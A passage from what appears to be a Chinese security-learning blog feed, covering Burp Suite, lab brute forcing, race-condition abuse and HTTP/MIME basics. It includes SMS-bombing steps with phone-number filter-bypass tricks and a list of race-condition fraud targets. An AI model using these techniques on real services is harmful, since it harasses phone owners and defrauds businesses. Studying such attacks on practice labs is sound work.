src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240115211252914.png" class=""><h4 id="Dashborad（视图模块）"><a href="#Dashborad（视图模块）" class="headerlink" title="Dashborad（视图模块）"></a>Dashborad（视图模块）</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240115214635042.png" class="" title="image-20240115214635042"><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240115214947763.png" class="" title="image-20240115214947763"><p><strong>更多的使用处是在目标模块（Targer）中右键某个扫描的url来进行相应的扫描或者爬取</strong></p><h4 id="Extensions（插件模块）"><a href="#Extensions（插件模块）" class="headerlink" title="Extensions（插件模块）"></a>Extensions（插件模块）</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240815102713442.png" class="" title="image-20240815102713442">]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破与并发相关学习</title>
      <link href="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="爆力破解"><a href="#爆力破解" class="headerlink" title="爆力破解"></a>爆力破解</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>暴力破解漏洞产生是由于服务器没有做限制，导致攻击者可以通过枚举的方法破解所需的信息，如用户名，密码，短信验证码等。其关键在于枚举的大小字典是否具有针对性，如登录时需要输入四位数验证码范围就是0000~9999</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>下面以pikachu靶场为例，随便输个账号密码，抓个包发送到intruder，给账号密码添加变量准备爆破。</p><img src="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240815101617578-1723690872128-1.png" class="" title="image-20240815101617578"><img src="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240815103330441.png" class="" title="image-20240815103330441"><p>选择模式为集束炸弹（Cluster bomb，模式选择详见前一篇文章），添加字典开始爆破</p><img src="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240815103740031.png" class="" title="image-20240815103740031"><p>之后开始爆破，观察结果中的Render，如果返回结果是login success，说明爆破成功，同时我们发现返回包的长度，成功的返回包和失败的返回包length不一样</p><img src="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240815104004562.png" class="" title="image-20240815104004562"><img src="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240815104143842.png" class="" title="image-20240815104143842"><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><h2 id="并发漏洞简介"><a href="#并发漏洞简介" class="headerlink" title="并发漏洞简介"></a>并发漏洞简介</h2><p>并发漏洞是指在并发执行环境下出现的编程错误或设计缺陷，这些缺陷可能导致程序行为不符合预期，甚至可能引发安全问题。并发编程通常涉及多个线程或进程同时执行，若不妥善管理这些并发操作，可能会出现各种问题。<br><strong>环境准备</strong>：burpsuite插件Turbo intruder</p><h3 id="常见场景："><a href="#常见场景：" class="headerlink" title="常见场景："></a><strong>常见场景：</strong></h3><p>漏洞出现在限制执行某个操作次数的地方。比如在网店多次使用相同的折扣代码</p><ol><li>多次兑换礼品卡</li><li>多次对产品评分</li><li>超出账户余额提取或转账现金</li><li>重复使用单个验证码解决方案</li><li>绕过反暴力破解速率限制</li></ol><p>常规流程，在抓到的报文处右键发送到Turbo intruder，之后选择插件race-single-packet-attack.py，更改协议，选择并发数，开始并发。</p><h3 id="验证码轰炸"><a href="#验证码轰炸" class="headerlink" title="验证码轰炸"></a>验证码轰炸</h3><p>点击获取验证码抓包，找到这个发送验证码的数据包，利用并发，同一时间多次对服务器发该数据包，从让服务器发送给手机多个验证码，可以造成短信轰炸效果</p><p><strong>绕过思路：</strong></p><p>手机号码前后加空格，86，086，0086，+86，0，00，&#x2F;r,&#x2F;n, 以及特殊符号等</p><p>修改cookie，变量，返回</p><p>138888888889 12位经过短信网关取前11位，导致短信轰炸</p><p>使用进行能解析的编码，比如url编码绕过</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http协议学习</title>
      <link href="/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="资源和URL"><a href="#资源和URL" class="headerlink" title="资源和URL"></a>资源和URL</h2><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>HTTP 请求的内容通称为“资源”。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 URI 来进行标识，例如下面的url其实是一张图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pic.imge.cc/2024/08/11/66b8b34a1deb8.jpg</span><br></pre></td></tr></table></figure><h3 id="URL与URN"><a href="#URL与URN" class="headerlink" title="URL与URN"></a>URL与URN</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>网址即URL（统一资源定位符），也就是web地址，例如下面就是一个URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ourobros.top</span><br></pre></td></tr></table></figure><p>URL 由多个必须或可选的组件构成。下面给出了一个复杂的 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ourobros.top/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL标准语法：协议://主机:端口/路径?参数1=值1&amp;参数2=值2#片段标识符</span><br><span class="line"></span><br><span class="line">##例如：（来自developer.mozilla.org）</span><br><span class="line">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument</span><br></pre></td></tr></table></figure><p><strong>协议</strong></p><p>于大部分 Web 资源，通常使用 HTTP 协议或其安全版本，HTTPS 协议。另外，浏览器也知道如何处理其他协议。例如， 协议指示浏览器打开邮件客户端；协议指示浏览器处理文件传输。常见的方案有：mailto:ftp:（更多协议见下图）</p><p><strong>主机</strong></p><p><a href="http://www.example.com/">www.example.com</a> 既是一个域名，也代表管理该域名的机构。它指示了需要向网络上的哪一台主机发起请求。当然，也可以直接向主机的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/IP_Address">IP address</a> 地址发起请求。但直接使用 IP 地址的场景并不常见</p><p><strong>端口</strong></p><p><strong>:80</strong> 是端口。它表示用于访问 Web 服务器上资源的技术“门”。如果访问的该 Web 服务器使用 HTTP 协议的标准端口（HTTP 为 80，HTTPS 为 443）授予对其资源的访问权限，则通常省略此部分。否则端口就是 URI 必须的部分。</p><p><strong>路径</strong></p><p>路径（&#x2F;path&#x2F;to&#x2F;myfile.html）是 Web 服务器上资源的路径。在 Web 的早期，类似这样的路径表示 Web 服务器上的物理文件位置。现在，它主要是由没有任何物理实体的 Web 服务器抽象处理而成的。</p><p><strong>参数</strong></p><p>?参数1&#x3D;值1&amp;参数2&#x3D;值2（?key1&#x3D;value1&amp;key2&#x3D;value2）是提供给 Web 服务器的额外参数。这些参数是用 &amp; 符号分隔的键&#x2F;值对列表。Web 服务器可以在将资源返回给用户之前使用这些参数来执行额外的操作。每个 Web 服务器都有自己的参数规则，想知道特定 Web 服务器如何处理参数的唯一可靠方法是询问该 Web 服务器所有者。</p><p><strong>片段</strong></p><p>#片段标识符（#SomewhereInTheDocument）是资源本身的某一部分的一个锚点。锚点代表资源内的一种“书签”，它给予浏览器显示位于该“加书签”点的内容的指示。例如，在 HTML 文档上，浏览器将滚动到定义锚点的那个点上；在视频或音频文档上，浏览器将转到锚点代表的那个时间。值得注意的是 # 号后面的部分，也称为片段标识符，永远不会与请求一起发送到服务器。</p><img src="/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20240812193128223.png" class="" title="image-20240812193128223"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##例如</span><br><span class="line">https://developer.mozilla.org/zh-CN/docs/Learn</span><br><span class="line">tel:+1-816-555-1212</span><br><span class="line">git@github.com:mdn/browser-compat-data.git</span><br><span class="line">ftp://example.org/resource.txt</span><br><span class="line">urn:isbn:9780141036144</span><br></pre></td></tr></table></figure><h4 id="URNs"><a href="#URNs" class="headerlink" title="URNs"></a>URNs</h4><p>URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">urn:isbn:9780141036144        </span><br><span class="line">urn:ietf:rfc:7230   </span><br><span class="line"></span><br><span class="line">##上面两个 URN 标识了下面的资源：</span><br><span class="line">乔治·奥威尔所著的《1984》</span><br><span class="line">IETF 规范 7230，超文本传输 协议 (HTTP/1.1)：Message Syntax and Routing.</span><br></pre></td></tr></table></figure><h2 id="Data-URL"><a href="#Data-URL" class="headerlink" title="Data URL"></a>Data URL</h2><p><strong>Data URL</strong>，即前缀为 data: 协议的 URL，其允许内容创建者向文档中嵌入小文件。它们之前被称作“data URI”，直到这个名字被 WHATWG 弃用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#语法</span><br><span class="line">前缀（data:）、指示数据类型的 MIME 类型、如果非文本则为可选的 base64 标记、数据本身</span><br><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">#mediatype 是个 MIME 类型的字符串，例如 &#x27;image/jpeg&#x27; 表示 JPEG 图像文件。如果被省略，则默认值为 text/plain;charset=US-ASCII。</span><br><span class="line">#如果数据包含RFC3986中定义为保留字符的字符或包含空格符、换行符或者其他非打印字符（:, /, ?, #, [, ], @, !, $, &amp;, &#x27;, (, ), *, +, ,, ;, =），这些字符必须进行百分号编码（又名“URL 编码”）。</span><br><span class="line">#如果数据是文本类型，你可以直接将文本嵌入（根据文档类型，使用合适的实体字符或转义字符）。否则，你可以指定 base64 来嵌入 base64 编码的二进制数据。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#示例</span><br><span class="line"></span><br><span class="line">#简单的 text/plain 类型数据。注意逗号URL编码为%2C，空格字符URL编码%20</span><br><span class="line">data:,Hello%2C%20World!</span><br><span class="line"># base64 编码版本</span><br><span class="line">data:text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D</span><br><span class="line"></span><br><span class="line">#一个 HTML 文档源代码 &lt;h1&gt;Hello, World&lt;/h1&gt;</span><br><span class="line">data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E</span><br><span class="line"></span><br><span class="line">#带有&lt;script&gt;alert(&#x27;hi&#x27;);&lt;/script&gt; 的 HTML 文档，用于执行 JavaScript 警告。注意，需要闭合 script 标签。</span><br><span class="line">data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><strong>base64编码</strong></p><p>Window.btoa()（也在 worker 中可用：从二进制数据字符串创建一个 Base64 编码的 ASCII 字符串（“btoa”应看作“从二进制到 ASCII”）</p><p>Window.atob()（也在 worker 中可用）：解码通过 Base64 编码的字符串数据（“atob”应看作“从 ASCII 到二进制”）</p><p><strong>linux中base64编码命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo -n hello|base64</span><br><span class="line"># outputs to console: aGVsbG8=</span><br><span class="line">echo -n hello&gt;a.txt</span><br><span class="line">base64 a.txt</span><br><span class="line"># outputs to console: aGVsbG8=</span><br><span class="line">base64 a.txt&gt;b.txt</span><br><span class="line"># outputs to file b.txt: aGVsbG8=</span><br></pre></td></tr></table></figure><p><strong>Window中进行base64编码</strong></p><p>在 Windows 中，PowerShell 的 Convert.ToBase64String可用于执行 Base64 编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(&quot;hello&quot;))</span><br><span class="line"># outputs to console: aGVsbG8=</span><br></pre></td></tr></table></figure><p>另一种方案是：使用 GNU&#x2F;Linux shell (例如 WSL）提供的使用工具 base64:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash$ echo -n hello | base64</span><br><span class="line"># outputs to console: aGVsbG8=</span><br></pre></td></tr></table></figure><p>ps：但是感觉window中base64位编码最好的方法是找一个base64编码网站或者随便找个工具</p><blockquote><p>[!NOTE]</p><p>许多安全问题（例如，钓鱼网站）已与 data URL 相关联，并在浏览器的顶层导航到它们。为了缓和这样的问题，在所有现代浏览器中，在顶层导航到 data: URL 是被禁止的。</p></blockquote><h2 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>MIME 类型通常仅包含两个部分：类型（type）和子类型（subtype），中间由斜杠 &#x2F; 分割，中间没有空白字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure><p>类型代表数据类型所属的大致分类，例如 video 或 text</p><p>子类型标识了 MIME 类型所代表的指定类型的确切数据类型。以 text 类型为例，它的子类型包括：plain（纯文本）、html、calender（iCalendar&#x2F;.ics 文件）</p><p>每种类型都有自己的一组可能的子类型。一个 MIME 类型总是包含类型与子类型这两部分，且二者必需成对出现。</p><p>有一个可选的参数，能够提供额外的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type/subtype;parameter=value</span><br></pre></td></tr></table></figure><p>例如，对于主类型为text的任何MIME类型，可以添加可选的charset参数，以指定数据中的字符所使用的字符集。如果没有指定 charset，默认值为ASCII（US-ASCII），除非被用户代理（User agent）的设置覆盖。要指定UTF-8文本文件，则使用MIME类型text&#x2F;plain;charset&#x3D;UTF-8</p><p>MIME 类型对大小写不敏感，但是传统写法都是小写。参数值可以是大小写敏感的。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>类型可分为两类：<strong>独立的</strong>（discrete）和<strong>多部分的</strong>（multipart）。独立类型代表单一文件或媒介，比如一段文字、一个音乐文件、一个视频文件等。而多部份类型，可以代表由多个部件组合成的文档，其中每个部分都可能有各自的 MIME 类型；此外，也可以代表多个文件被封装在单次事务中一同发送。多部分 MIME 类型的一个例子是，在电子邮件中附加多个文件。</p><h4 id="独立类型"><a href="#独立类型" class="headerlink" title="独立类型"></a>独立类型</h4><p><strong>application：</strong></p><p>不明确属于其他类型之一的任何二进制数据；要么是将以某种方式执行或解释的数据，要么是需要借助某个或某类特定应用程序来使用的二进制数据。通用二进制数据（或真实类型未知的二进制数据）是 application&#x2F;octet-stream。其他常用的示例包含 application&#x2F;pdf<code>、</code>application&#x2F;pkcs8和application&#x2F;zip</p><p><strong>audio：</strong></p><p>音频或音乐数据。常见的示例如 audio&#x2F;mpeg、audio&#x2F;vorbis</p><p><strong>example：</strong></p><p>在演示如何使用 MIME 类型的示例中用作占位符的保留类型。这一类型永远不应在示例代码或文档外使用。example也可以作为子类型。例如，在一个处理音频有关的示例中，MIME 类型 audio&#x2F;example 表示该类型是一个占位符，且在实际使用这段代码时，此处应当被替换成适当的类型。</p><p><strong>font：</strong></p><p>字体&#x2F;字型数据。常见的示例如 font&#x2F;woff、font&#x2F;ttf 和 font&#x2F;otf</p><p><strong>image：</strong></p><p>图像或图形数据，包括位图和矢量静态图像，以及静态图像格式的动画版本，如 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/GIF">GIF</a> 动画或 APNG。常见的例子有 image&#x2F;jpeg、image&#x2F;png 和 image&#x2F;svg+xml</p><p><strong>model：</strong></p><p>三维物体或场景的模型数据。示例包含 model&#x2F;3mf 和 model&#x2F;vrml</p><p><strong>text：</strong></p><p>纯文本数据，包括任何人类可读内容、源代码或文本数据——如逗号分隔值（comma-separated value，即 CSV）格式的数据。示例包含：text&#x2F;plain、text&#x2F;csv 和 text&#x2F;html</p><p><strong>video：</strong></p><p>视频数据或文件，例如 MP4 电影（video&#x2F;mp4）</p><blockquote><p>[!NOTE]</p><p>对于那些没有明确子类型的文本文档，应使用 text&#x2F;plain。类似的，没有明确子类型或子类型未知的二进制文件，应使用 application&#x2F;octet-stream。</p></blockquote><h4 id="多部份类型"><a href="#多部份类型" class="headerlink" title="多部份类型"></a>多部份类型</h4><p><strong>多部分</strong>类型指的是一类可分成不同部分的文件，其各部分通常是不同的 MIME 类型；也可用于——尤其在电子邮件中——表示属于同一事务的多个独立文件。它们代表一个<strong>复合文档</strong>。</p><p><strong>message：</strong></p><p>封装其他信息的信息。例如，这可以用来表示将转发信息作为其数据一部分的电子邮件，或将超大信息分块发送，就像发送多条信息一样。例如，message&#x2F;rfc822（用于转发或回复信息的引用）和 message&#x2F;partial（允许将大段信息自动拆分成小段，由收件人重新组装）是两个常见的例子。</p><p><strong>multipart：</strong></p><p>由多个组件组成的数据，这些组件可能各自具有不同的 MIME 类型。例如，multipart&#x2F;form-data（用于使用 FormData API 生成的数据）和 multipart&#x2F;byteranges</p><h3 id="比较重要的MIME类型"><a href="#比较重要的MIME类型" class="headerlink" title="比较重要的MIME类型"></a>比较重要的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#这是二进制文件的默认值</span><br><span class="line">application/octet-stream</span><br><span class="line"></span><br><span class="line">#这是文本文件的默认值</span><br><span class="line">text/plain</span><br><span class="line"></span><br><span class="line">#在网页中要被解析为CSS的任何CSS文件必须指定MIME为text/css</span><br><span class="line">text/css</span><br><span class="line"></span><br><span class="line">#所有的HTML内容都应该使用这种类型</span><br><span class="line">text/html</span><br><span class="line"></span><br><span class="line">#JavaScript内容应始终使用MIME类型text/javascript提供，使用除text/javascript以外的任何MIME类型都可能导致脚本无法加载或运行。</span><br><span class="line">text/javascript</span><br><span class="line"></span><br><span class="line">#图片类型</span><br><span class="line">image/apng：动画便携式网络图形（APNG）</span><br><span class="line">image/avif：AV1 图像文件格式（AVIF）</span><br><span class="line">image/gif：图形交换格式（GIF）</span><br><span class="line">image/jpeg：联合图像专家小组图片（JPEG）</span><br><span class="line">image/png：便携式网络图形（PNG）</span><br><span class="line">image/svg+xml：可缩放矢量图形（SVG）</span><br><span class="line">image/webp：Web 图像格式（WEBP）</span><br></pre></td></tr></table></figure><p>音频与视频类型</p><img src="/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20240813195302211.png" class="" title="image-20240813195302211"><p><strong>可用于HTML表单从浏览器发送信息给服务器</strong></p><p> multipart&#x2F;form-data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#作为多部分文档格式，它由边界线（一个由双横滑线 -- 开始的字符串）划分出的不同部分组成。每一部分有自己的实体，以及自己的 HTTP 请求头，Content-Disposition 和 Content-Type 用于文件上传字段。</span><br><span class="line">Content-Type: multipart/form-data; boundary=aBoundaryString</span><br><span class="line">(other headers associated with the multipart document as a whole)</span><br><span class="line"></span><br><span class="line">--aBoundaryString</span><br><span class="line">Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;img.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">(data)</span><br><span class="line">--aBoundaryString</span><br><span class="line">Content-Disposition: form-data; name=&quot;myField&quot;</span><br><span class="line"></span><br><span class="line">(data)</span><br><span class="line">--aBoundaryString</span><br><span class="line">(more subparts)</span><br><span class="line">--aBoundaryString--</span><br></pre></td></tr></table></figure><p>如下所示的 <form>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=&quot;http://localhost:8000/&quot;</span><br><span class="line">  method=&quot;post&quot;</span><br><span class="line">  enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  &lt;label&gt;名字：&lt;input name=&quot;myTextField&quot; value=&quot;Test&quot; /&gt;&lt;/label&gt;</span><br><span class="line">  &lt;label&gt;&lt;input type=&quot;checkbox&quot; name=&quot;myCheckBox&quot; /&gt; 勾选&lt;/label&gt;</span><br><span class="line">  &lt;label&gt;</span><br><span class="line">    上传文件：&lt;input type=&quot;file&quot; name=&quot;myFile&quot; value=&quot;test.txt&quot; /&gt;</span><br><span class="line">  &lt;/label&gt;</span><br><span class="line">  &lt;button&gt;发送文件&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>会发送这样的请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------8721656041911415653955004498</span><br><span class="line">Content-Length: 465</span><br><span class="line"></span><br><span class="line">-----------------------------8721656041911415653955004498</span><br><span class="line">Content-Disposition: form-data; name=&quot;myTextField&quot;</span><br><span class="line"></span><br><span class="line">Test</span><br><span class="line">-----------------------------8721656041911415653955004498</span><br><span class="line">Content-Disposition: form-data; name=&quot;myCheckBox&quot;</span><br><span class="line"></span><br><span class="line">on</span><br><span class="line">-----------------------------8721656041911415653955004498</span><br><span class="line">Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Simple file.</span><br><span class="line">-----------------------------8721656041911415653955004498--</span><br></pre></td></tr></table></figure><p><strong>multipart&#x2F;byteranges用于把部分的响应报文发送回浏览器。</strong></p><p>multipart&#x2F;byteranges</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5</span><br><span class="line">Content-Length: 385</span><br><span class="line"></span><br><span class="line">--3d6b6a416f9b5</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Range: bytes 100-200/1270</span><br><span class="line"></span><br><span class="line">eta http-equiv=&quot;Content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content</span><br><span class="line">--3d6b6a416f9b5</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Range: bytes 300-400/1270</span><br><span class="line"></span><br><span class="line">-color: #f0f0f2;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">        font-family: &quot;Open Sans&quot;, &quot;Helvetica</span><br><span class="line">--3d6b6a416f9b5--</span><br></pre></td></tr></table></figure><h3 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a>MIME嗅探</h3><p>因为浏览器使用MIME类型，而不是文件扩展名来决定如何处理一个URL，所以Web服务器在响应的Content-Type头中发送正确的MIME类型非常重要。如果没有正确配置，浏览器很可能会误解文件的内容，网站将无法正常运行，下载的文件也可能会被错误处理。</p><p>为了解决这个问题，或者说是更好的用户体验，很多浏览器会进行MIME内容嗅探，也就是通过解析文件的内容，来猜测MIME类型的格式。</p><p>不同的浏览器处理MIME嗅探的方式是不一样的。但是他们都可能会产生严重的安全漏洞，因为有些MIME类型是可执行类型的，恶意攻击者可以通过混淆MIME嗅探算法，从而使攻击者可以进行网站运营者或用户都没有预料到的操作，如跨站脚本攻击。</p><p>如果不想浏览器端进行嗅探，可以在服务端的响应中设置 X-Content-Type-Options 头，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Content-Type-Options: nosniff</span><br></pre></td></tr></table></figure><h3 id="MIME类型总结"><a href="#MIME类型总结" class="headerlink" title="MIME类型总结"></a>MIME类型总结</h3><p><strong>text&#x2F;plain</strong>表示文本文件的默认值。一个文本文件应当是人类可读的，并且不包含二进制数据。</p><p><strong>application&#x2F;octet-stream</strong>表示所有其他情况的默认值。一种未知的文件类型应当使用此类型。浏览器在处理这些文件时会特别小心，试图防止、避免用户的危险行为。</p><p>IANA 是 MIME 媒体类型的官方注册机构，并维护了官方所有 MIME 类型的列表<a href="https://www.iana.org/assignments/media-types/media-types.xhtml">https://www.iana.org/assignments/media-types/media-types.xhtml</a></p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><h3 id="协议"><a href="#协议" class="headerlink" 